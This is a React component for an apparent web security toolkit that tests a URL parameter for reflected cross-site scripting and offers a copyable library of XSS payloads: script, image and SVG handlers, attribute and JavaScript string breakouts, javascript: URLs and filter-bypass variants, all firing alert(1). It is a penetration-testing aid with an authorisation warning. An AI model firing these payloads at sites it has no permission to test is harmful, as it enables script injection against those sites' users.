import { useState } from "react";
import CyberpunkCard from "@/components/CyberpunkCard";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2, AlertCircle, ShieldAlert, ShieldCheck, Copy, Check, Code } from "lucide-react";
import { API_BASE_URL } from "@/lib/api";

interface PayloadCategory {
  context: string;
  payloads: Array<{ payload: string; description: string }>;
}

interface XSSResult {
  url: string;
  parameter: string;
  vulnerable: boolean;
  xssType?: string;
  payloadUsed?: string;
  context?: string;
  recommendations: string[];
  payloadLibrary: PayloadCategory[];
  scanDuration: number;
}

const XSSPayloadGenerator = () => {
  const [activeTab, setActiveTab] = useState<"tester" | "library">("tester");
  const [url, setUrl] = useState("");
  const [parameter, setParameter] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<XSSResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState<string | null>(null);
  const [libraryFilter, setLibraryFilter] = useState("HTML");

  // Static payload library (always available)
  const staticLibrary: PayloadCategory[] = [
    {
      context: "HTML", payloads: [
        { payload: "<script>alert(1)</script>", description: "Basic script tag" },
        { payload: "<img src=x onerror=alert(1)>", description: "Image error handler" },
        { payload: "<svg onload=alert(1)>", description: "SVG onload" },
        { payload: "<body onload=alert(1)>", description: "Body onload" },
        { payload: "<details open ontoggle=alert(1)>", description: "Details toggle" },
      ],
    },
    {
      context: "Attribute", payloads: [
        { payload: '"><script>alert(1)</script>', description: "Break out of attribute" },
        { payload: "\" onmouseover=\"alert(1)\"", description: "Event handler injection" },
        { payload: "' autofocus onfocus='alert(1)'", description: "Autofocus onfocus" },
      ],
    },
    {
      context: "JavaScript", payloads: [
        { payload: '"-alert(1)-"', description: "String break" },
        { payload: ";</script><script>alert(1)", description: "Script close/reopen" },
        { payload: "`;alert(1)//`", description: "Template literal break" },
      ],
    },
    {
      context: "URL", payloads: [
        { payload: "javascript:alert(1)", description: "JS URL scheme" },
        { payload: "data:text/html,<script>alert(1)</script>", description: "Data URI" },
      ],
    },
    {
      context: "Filter Bypass", payloads: [
        { payload: "<ScRiPt>alert(1)</sCrIpT>", description: "Case mutation" },
        { payload: "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;49&#41;\">", description: "HTML entities" },
        { payload: "<svg><script>alert(1)</script></svg>", description: "SVG wrapper" },
      ],
    },
  ];

  const library = result?.payloadLibrary || staticLibrary;
  const contexts = library.map((c) => c.context);
  const activeCategory = library.find((c) => c.context === libraryFilter) || library[0];

  const handleTest = async () => {
    if (!url.trim() || !parameter.trim()) return;
    setIsLoading(true);
    setResult(null);
    setError(null);

    try {
      const response = await fetch(`${API_BASE_URL}/api/scan/xss-test`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: url.trim(), parameter: parameter.trim(), timeoutMs: 10000 }),
      });
      if (!response.ok) {
        const errData = await response.json();
        throw new Error(errData.error || "Test failed");
      }
      const data = await response.json();
      setResult(data);
    } catch (err: any) {
      setError(err.message || "Failed to connect to XSS test service");
    } finally {
      setIsLoading(false);
    }
  };

  const copyPayload = async (payload: string, key: string) => {
    await navigator.clipboard.writeText(payload);
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  const copyAll = async () => {
    if (!activeCategory) return;
    const all = activeCategory.payloads.map((p) => p.payload).join("\n");
    await navigator.clipboard.writeText(all);
    setCopied("all");
    setTimeout(() => setCopied(null), 2000);
  };

  return (
    <CyberpunkCard title="XSS PAYLOAD GENERATOR">
      <div className="space-y-6">
        {/* Tabs */}
        <div className="flex gap-1 p-1 bg-black/30 rounded border border-cyber-cyan/20">
          <button
            onClick={() => setActiveTab("tester")}
            className={`flex-1 py-2 rounded text-sm font-bold tracking-wide transition-colors ${
              activeTab === "tester" ? "bg-cyber-cyan text-black" : "text-cyber-cyan hover:bg-cyber-cyan/20"
            }`}
          >
            Active Tester
          </button>
          <button
            onClick={() => setActiveTab("library")}
            className={`flex-1 py-2 rounded text-sm font-bold tracking-wide transition-colors ${
              activeTab === "library" ? "bg-cyber-cyan text-black" : "text-cyber-cyan hover:bg-cyber-cyan/20"
            }`}
          >
            Payload Library
          </button>
        </div>

        {activeTab === "tester" && (
          <div className="space-y-4">
            {/* Warning */}
            <div className="p-3 bg-yellow-500/10 border border-yellow-500/30 rounded text-yellow-400 text-xs">
              ⚠ Only test applications you own or have explicit written permission to test. This tool detects XSS reflection only — not execution.
            </div>

            <div>
              <label className="block text-xs text-cyber-cyan tracking-wider mb-2">TARGET URL</label>
              <Input value={url} onChange={(e) => setUrl(e.target.value)} placeholder="https://example.com/search" className="bg-black/50 border-cyber-cyan/30 text-cyber-cyan font-mono" disabled={isLoading} />
            </div>
            <div>
              <label className="block text-xs text-cyber-cyan tracking-wider mb-2">PARAMETER TO TEST</label>
              <Input value={parameter} onChange={(e) => setParameter(e.target.value)} placeholder="q" className="bg-black/50 border-cyber-cyan/30 text-cyber-cyan font-mono" disabled={isLoading} />
            </div>

            <Button onClick={handleTest} disabled={isLoading || !url.trim() || !parameter.trim()} className="w-full bg-cyber-red hover:bg-cyber-red/80 text-white font-bold tracking-wider">
              {isLoading ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" />Testing...</> : <><Code className="w-4 h-4 mr-2" />RUN XSS TEST</>}
            </Button>

            {error && (
              <div className="flex items-center gap-2 p-3 bg-red-500/10 border border-red-500/30 rounded text-red-400 text-sm">
                <AlertCircle className="w-4 h-4 flex-shrink-0" /><span>{error}</span>
              </div>
            )}

            {result && (
              <div className="space-y-4">
                <div className={`flex items-center gap-4 p-5 rounded border ${result.vulnerable ? "bg-red-500/20 border-red-500/30 text-red-400" : "bg-green-500/20 border-green-500/30 text-green-400"}`}>
                  {result.vulnerable ? <ShieldAlert className="w-8 h-8 flex-shrink-0" /> : <ShieldCheck className="w-8 h-8 flex-shrink-0" />}
                  <div>
                    <p className="text-xl font-bold">{result.vulnerable ? "XSS REFLECTION DETECTED" : "NOT DETECTED"}</p>
                    {result.payloadUsed && <p className="text-xs font-mono mt-1 opacity-80">Payload: {result.payloadUsed}</p>}
                  </div>
                </div>

                <div className="glass-panel rounded p-4">
                  <h3 className="text-cyber-cyan font-bold tracking-wide mb-3">RECOMMENDATIONS</h3>
                  <ul className="space-y-1">
                    {result.recommendations.map((r, i) => (
                      <li key={i} className="flex items-start gap-2 text-sm text-gray-300"><span className="text-green-400">✓</span>{r}</li>
                    ))}
                  </ul>
                </div>
              </div>
            )}
          </div>
        )}

        {activeTab === "library" && (
          <div className="space-y-4">
            {/* Context filter */}
            <div className="flex gap-2 flex-wrap">
              {contexts.map((ctx) => (
                <button key={ctx} onClick={() => setLibraryFilter(ctx)}
                  className={`px-3 py-1 rounded text-xs font-bold border transition-colors ${libraryFilter === ctx ? "bg-cyber-cyan text-black border-cyber-cyan" : "text-cyber-cyan border-cyber-cyan/30 hover:bg-cyber-cyan/10"}`}>
                  {ctx}
                </button>
              ))}
              <button onClick={copyAll}
                className="ml-auto flex items-center gap-1 px-3 py-1 bg-cyber-cyan/20 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/30 rounded text-xs transition-colors">
                {copied === "all" ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                {copied === "all" ? "Copied!" : "Copy All"}
              </button>
            </div>

            {activeCategory && (
              <div className="space-y-2">
                {activeCategory.payloads.map((p, i) => {
                  const key = `${activeCategory.context}-${i}`;
                  return (
                    <div key={key} className="glass-panel rounded p-3 flex items-start gap-3">
                      <div className="flex-1 min-w-0">
                        <p className="text-xs text-gray-400 mb-1">{p.description}</p>
                        <pre className="text-xs text-green-400 font-mono break-all whitespace-pre-wrap">{p.payload}</pre>
                      </div>
                      <button onClick={() => copyPayload(p.payload, key)}
                        className="flex-shrink-0 flex items-center gap-1 px-2 py-1 bg-cyber-cyan/20 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/30 rounded text-xs transition-colors">
                        {copied === key ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                      </button>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}
      </div>
    </CyberpunkCard>
  );
};

export default XSSPayloadGenerator;
